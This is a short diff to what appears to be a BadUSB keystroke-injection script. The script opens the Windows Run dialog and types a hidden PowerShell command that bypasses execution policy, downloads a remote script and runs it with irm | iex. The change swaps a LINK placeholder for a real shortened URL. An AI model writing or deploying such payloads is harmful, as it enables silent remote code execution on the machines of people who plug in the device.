@@ -9,5 +9,5 @@ REM └────────────────────────�
 ESC
 GUI r
 DELAY 750
-STRING powershell -NoP -Ep Bypass -W H -C "$text='WRITE_YOUR_TEXT'; irm LINK | iex"
+STRING powershell -NoP -Ep Bypass -W H -C "$text='WRITE_YOUR_TEXT'; irm https://is.gd/m4arL4 | iex"
 ENTER
